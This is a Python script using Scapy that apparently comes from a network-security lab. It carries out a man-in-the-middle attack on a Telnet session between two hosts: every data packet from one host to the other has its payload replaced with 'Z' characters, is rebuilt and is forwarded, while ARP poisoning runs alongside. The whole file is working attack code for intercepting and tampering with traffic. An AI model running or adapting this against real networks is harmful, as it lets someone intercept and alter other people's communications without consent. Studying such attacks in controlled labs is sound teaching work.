#!/usr/bin/env python3
from scapy.all import *
import os # For clearing the screen

# --- Configuration ---
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05" # Actual MAC of Host A
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06" # Actual MAC of Host B

# Ensure this is Host M's MAC address on the relevant interface
ATTACKER_MAC = "02:42:0a:09:00:69" 
INTERFACE = "eth0" # Interface Host M uses on the 10.9.0.0/24 network

def spoof_pkt(pkt):
    # Make sure the packet has an IP layer
    if not IP in pkt:
        return

    # Packet from A (Client) to B (Server)
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        if TCP in pkt and Raw in pkt: # Check for TCP payload
            original_payload = pkt[Raw].load
            modified_payload_bytes = b'Z' * len(original_payload) # Replace every char with 'Z'

            print(f"[A->B] Original: {original_payload.decode(errors='ignore')} | Modified to: {modified_payload_bytes.decode(errors='ignore')}")

            # Construct new packet
            # Ethernet layer: Attacker MAC to Real MAC of B
            new_ether = Ether(src=ATTACKER_MAC, dst=MAC_B)

            # IP layer: Original IPs, Scapy handles TTL decrement if needed
            new_ip = IP(src=pkt[IP].src, dst=pkt[IP].dst, id=pkt[IP].id, ttl=pkt[IP].ttl) # Keep original ID, adjust TTL if needed
            # If Scapy doesn't decrement TTL automatically when forwarding, you might need:
            # new_ip.ttl = pkt[IP].ttl -1 (if pkt[IP].ttl > 1 else 1)


            # TCP layer: Copy ports, flags, seq/ack numbers. Replace payload.
            new_tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                          flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                          window=pkt[TCP].window, options=pkt[TCP].options)

            response_pkt = new_ether/new_ip/new_tcp/modified_payload_bytes

            # Delete checksums so Scapy recalculates them
            if IP in response_pkt:
                del response_pkt[IP].chksum
            if TCP in response_pkt:
                del response_pkt[TCP].chksum

            sendp(response_pkt, iface=INTERFACE, verbose=False)
        else: # Not a data packet (e.g. ACK, SYN), just forward
            # print(f"[A->B] Forwarding non-data packet: {pkt.summary()}")
            pkt[Ether].src = ATTACKER_MAC
            pkt[Ether].dst = MAC_B
            if IP in pkt: del pkt[IP].chksum # Recalculate
            if TCP in pkt: del pkt[TCP].chksum # Recalculate
            sendp(pkt, iface=INTERFACE, verbose=False)
        return

    # Packet from B (Server) to A (Client) - e.g., Telnet echo, prompt
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # print(f"[B->A] Forwarding: {pkt.summary()}")
        # Forward B's packets to A without modification of payload
        # Ether layer: Attacker MAC to Real MAC of A
        pkt[Ether].src = ATTACKER_MAC
        pkt[Ether].dst = MAC_A # Set correct MAC for A

        # Delete checksums so Scapy recalculates them
        if IP in pkt:
            del pkt[IP].chksum
        if TCP in pkt:
            del pkt[TCP].chksum

        sendp(pkt, iface=INTERFACE, verbose=False)
        return

if __name__ == "__main__":
    os.system("clear") # Clear screen
    print("[*] Starting Telnet MITM Sniff-and-Spoof Script...")
    print(f"[*] Attacking Telnet between {IP_A} and {IP_B}")
    print(f"[*] Characters from A to B will be replaced with 'Z'.")
    print(f"[*] Ensure IP forwarding is OFF on this machine (Host M): sudo sysctl net.ipv4.ip_forward=0")
    print(f"[*] Ensure ARP poisoning scripts are running for both {IP_A} and {IP_B}.")
    print(f"[*] Listening on interface: {INTERFACE}")
    print("----------------------------------------------------------")

    # Filter: Capture TCP traffic between Host A and Host B.
    # Avoid capturing packets sent by this script itself if possible (can be tricky).
    # The logic within spoof_pkt (e.g., checking pkt[IP].src/dst) is the primary defense against loops here.
    # A more specific BPF filter could be:
    # bpf_filter = f"tcp and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A})) and not ether src {ATTACKER_MAC}"
    # However, since we are re-writing the Ether src to ATTACKER_MAC, this might filter our own forwarded packets.
    # For simplicity, the IP host filter is often sufficient if the handler logic is correct.
    bpf_filter = f"tcp and (host {IP_A} or host {IP_B})"

    try:
        sniff(iface=INTERFACE, filter=bpf_filter, prn=spoof_pkt, store=0)
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        print("[*] MITM script stopped.")